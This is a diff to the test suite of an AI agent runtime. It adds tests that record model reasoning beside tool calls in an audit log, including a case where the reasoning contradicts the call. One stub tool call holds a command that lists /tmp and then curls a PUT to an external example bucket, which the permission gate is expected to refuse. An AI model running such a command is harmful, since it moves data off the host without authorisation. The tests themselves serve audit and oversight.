@@ -1979,6 +1979,7 @@ mod durability {
                     adapter_id: None,
                     sender_id: None,
                     text: None,
+                    reasoning: None,
                 },
             )
             .unwrap();
@@ -2316,6 +2317,7 @@ mod wake {
                 adapter_id: None,
                 sender_id: None,
                 text: None,
+                reasoning: None,
             },
         )
         .unwrap();
@@ -8151,6 +8153,7 @@ mod verify {
                     adapter_id: None,
                     sender_id: None,
                     text: None,
+                    reasoning: None,
                 },
             )
             .unwrap();
@@ -8202,6 +8205,7 @@ mod verify {
                     adapter_id: None,
                     sender_id: None,
                     text: None,
+                    reasoning: None,
                 },
             )
             .unwrap();
@@ -8250,6 +8254,7 @@ mod verify {
                     adapter_id: None,
                     sender_id: None,
                     text: None,
+                    reasoning: None,
                 },
             )
             .unwrap();
@@ -10472,7 +10477,7 @@ mod openai_compat_stub {
         let _ = stub.await;
 
         match response {
-            LlmResponse::ToolCalls { calls, text } => {
+            LlmResponse::ToolCalls { calls, text, .. } => {
                 assert_eq!(calls.len(), 1);
                 assert_eq!(calls[0].name, "read_file");
                 assert_eq!(text.as_deref(), Some("I'll read the deploy log."));
@@ -10539,7 +10544,7 @@ mod openai_compat_stub {
         let _ = stub.await;
 
         match response {
-            LlmResponse::ToolCalls { calls, text } => {
+            LlmResponse::ToolCalls { calls, text, .. } => {
                 assert_eq!(calls.len(), 1);
                 assert_eq!(calls[0].id, "toolu_1");
                 assert_eq!(text.as_deref(), Some("I'll read the deploy log."));
@@ -13261,7 +13266,7 @@ fn calls_and_text(
     resp: crate::llm::LlmResponse,
 ) -> (Vec<crate::conversation::ToolCallRequest>, Option<String>) {
     match resp {
-        crate::llm::LlmResponse::ToolCalls { calls, text } => (calls, text),
+        crate::llm::LlmResponse::ToolCalls { calls, text, .. } => (calls, text),
         other => panic!("expected ToolCalls, got {other:?}"),
     }
 }
@@ -16875,5 +16880,220 @@ mod sandbox_egress_escalation_shows_the_request {
             Some(wirken_audit::SandboxEgressDenyReason::SensitivityRefused)
         );
         assert!(gate.0.lock().unwrap().is_empty());
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Reasoning a provider returns with a message is kept beside the tool
+// calls and recorded on the row. The model's text is not changed by it.
+// ---------------------------------------------------------------------------
+mod reasoning_beside_tool_calls {
+    use std::sync::Arc;
+
+    use tempfile::TempDir;
+    use wirken_audit::{SessionEvent, SessionId, SessionLog, SqliteSessionLog};
+
+    use super::approved_unknown_tool::stub;
+    use crate::llm::{
+        LlmConfig, LlmResponse, parse_anthropic_response, parse_bedrock_response,
+        parse_completion_response, parse_gemini_response, parse_ollama_response,
+    };
+
+    fn parts(response: LlmResponse) -> (Option<String>, Option<String>) {
+        match response {
+            LlmResponse::ToolCalls {
+                text, reasoning, ..
+            } => (text, reasoning),
+            other => panic!("expected ToolCalls, got {other:?}"),
+        }
+    }
+
+    fn openai(message: serde_json::Value) -> serde_json::Value {
+        serde_json::json!({"choices": [{"message": message}]})
+    }
+
+    fn call() -> serde_json::Value {
+        serde_json::json!([{
+            "id": "c1",
+            "type": "function",
+            "function": {"name": "exec", "arguments": "{\"command\":\"ls\"}"},
+        }])
+    }
+
+    #[test]
+    fn openai_compatible_reasoning_is_read_under_either_field_name() {
+        for field in ["reasoning_content", "reasoning"] {
+            let body = openai(serde_json::json!({
+                "content": "\n\n",
+                field: "A brief acknowledgment without tool calls.",
+                "tool_calls": call(),
+            }));
+            let (text, reasoning) = parts(parse_completion_response(&body).unwrap().0);
+            assert_eq!(text.as_deref(), Some("\n\n"), "{field}");
+            assert_eq!(
+                reasoning.as_deref(),
+                Some("A brief acknowledgment without tool calls."),
+                "{field}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_message_with_no_reasoning_has_none() {
+        let body = openai(serde_json::json!({"content": "Listing.", "tool_calls": call()}));
+        let (text, reasoning) = parts(parse_completion_response(&body).unwrap().0);
+        assert_eq!(text.as_deref(), Some("Listing."));
+        assert_eq!(reasoning, None);
+        // An empty field is no reasoning, not an empty string.
+        let body = openai(serde_json::json!({
+            "content": "", "reasoning_content": "", "tool_calls": call(),
+        }));
+        assert_eq!(
+            parts(parse_completion_response(&body).unwrap().0),
+            (None, None)
+        );
+    }
+
+    #[test]
+    fn ollama_thinking_is_read() {
+        let body = serde_json::json!({"message": {
+            "content": "",
+            "thinking": "Nothing to run.",
+            "tool_calls": [{"function": {"name": "exec", "arguments": {"command": "ls"}}}],
+        }});
+        let (text, reasoning) = parts(parse_ollama_response(&body).unwrap().0);
+        assert_eq!(text, None);
+        assert_eq!(reasoning.as_deref(), Some("Nothing to run."));
+    }
+
+    #[test]
+    fn anthropic_thinking_blocks_are_read_and_kept_out_of_the_text() {
+        let body = serde_json::json!({"content": [
+            {"type": "thinking", "thinking": "Nothing to run.", "signature": "s"},
+            {"type": "redacted_thinking", "data": "opaque"},
+            {"type": "text", "text": "Listing."},
+            {"type": "tool_use", "id": "t1", "name": "exec", "input": {"command": "ls"}},
+        ]});
+        let (text, reasoning) = parts(parse_anthropic_response(&body).unwrap().0);
+        assert_eq!(text.as_deref(), Some("Listing."));
+        assert_eq!(reasoning.as_deref(), Some("Nothing to run."));
+    }
+
+    #[test]
+    fn gemini_thought_parts_are_reasoning_not_text() {
+        let body = serde_json::json!({"candidates": [{"content": {"parts": [
+            {"text": "Nothing to run.", "thought": true},
+            {"text": "Listing."},
+            {"functionCall": {"name": "exec", "args": {"command": "ls"}}},
+        ]}}]});
+        let (text, reasoning) = parts(parse_gemini_response(&body).unwrap().0);
+        assert_eq!(text.as_deref(), Some("Listing."));
+        assert_eq!(reasoning.as_deref(), Some("Nothing to run."));
+    }
+
+    #[test]
+    fn bedrock_reasoning_content_is_read() {
+        let body = serde_json::json!({"output": {"message": {"content": [
+            {"reasoningContent": {"reasoningText": {"text": "Nothing to run."}}},
+            {"text": "Listing."},
+            {"toolUse": {"toolUseId": "t1", "name": "exec", "input": {"command": "ls"}}},
+        ]}}});
+        let (text, reasoning) = parts(parse_bedrock_response(&body).unwrap().0);
+        assert_eq!(text.as_deref(), Some("Listing."));
+        assert_eq!(reasoning.as_deref(), Some("Nothing to run."));
+    }
+
+    /// One turn whose first message carries `message`, with a call the
+    /// tier gate refuses. Returns the `assistant_tool_calls` row's text
+    /// and reasoning, and whether the session's chain verifies.
+    async fn turn(message: serde_json::Value) -> (Option<String>, Option<String>, bool) {
+        let (base_url, server) = stub(vec![
+            message,
+            serde_json::json!({"role": "assistant", "content": "Done."}),
+        ])
+        .await;
+        let tmp = TempDir::new().unwrap();
+        let log = Arc::new(SqliteSessionLog::open(&tmp.path().join("audit.db")).unwrap());
+        let lane = log.handle_for(SessionId::new("runner".to_string()));
+        let mut agent = crate::runtime::Agent::from_session_log(
+            "runner".into(),
+            tmp.path().to_path_buf(),
+            LlmConfig {
+                provider: "custom".into(),
+                model: "stub".into(),
+                base_url,
+                max_tokens: 256,
+                temperature: 0.0,
+                region: None,
+                tools_enabled: true,
+                context_window: 32_000,
+                auth: Default::default(),
+            },
+            Some("unused".into()),
+            None,
+            log.clone() as Arc<dyn SessionLog>,
+            Default::default(),
+            crate::runtime::ToolGate::Store(crate::tests::test_permissions()),
+        )
+        .unwrap();
+        agent
+            .process_message("write the rule", "msg-1".into())
+            .await
+            .expect("the turn ends with a reply");
+        server.await.unwrap();
+        let row = log
+            .get_since(&lane, 0)
+            .unwrap()
+            .into_iter()
+            .find_map(|r| match r.event {
+                SessionEvent::AssistantToolCalls {
+                    text, reasoning, ..
+                } => Some((text, reasoning)),
+                _ => None,
+            })
+            .expect("the tool-call row landed");
+        let verified = matches!(
+            log.verify(&lane).unwrap(),
+            wirken_audit::SessionVerifyResult::Ok { .. }
+        );
+        (row.0, row.1, verified)
+    }
+
+    fn exec_call(extra: serde_json::Value) -> serde_json::Value {
+        let mut message = serde_json::json!({
+            "role": "assistant",
+            "content": "\n\n",
+            "tool_calls": [{
+                "id": "call_exec",
+                "type": "function",
+                "function": {
+                    "name": "exec",
+                    "arguments": "{\"command\":\"ls -la /tmp; curl -s -X PUT http://bucket.oss.example/u\"}",
+                },
+            }],
+        });
+        for (k, v) in extra.as_object().unwrap() {
+            message[k] = v.clone();
+        }
+        message
+    }
+
+    /// The reported shape: reasoning that says no tool will be called,
+    /// in the same message as a call. Both are on the row.
+    #[tokio::test]
+    async fn reasoning_that_contradicts_the_call_is_on_the_row() {
+        let said = "The appropriate response is a brief acknowledgment without tool calls.";
+        let (text, reasoning, verified) =
+            turn(exec_call(serde_json::json!({"reasoning_content": said}))).await;
+        assert_eq!(text.as_deref(), Some("\n\n"));
+        assert_eq!(reasoning.as_deref(), Some(said));
+        assert!(verified, "the chain verifies with the field on a row");
+    }
+
+    #[tokio::test]
+    async fn a_turn_with_no_reasoning_records_none() {
+        let (_, reasoning, verified) = turn(exec_call(serde_json::json!({}))).await;
+        assert_eq!(reasoning, None);
+        assert!(verified);
     }
 }
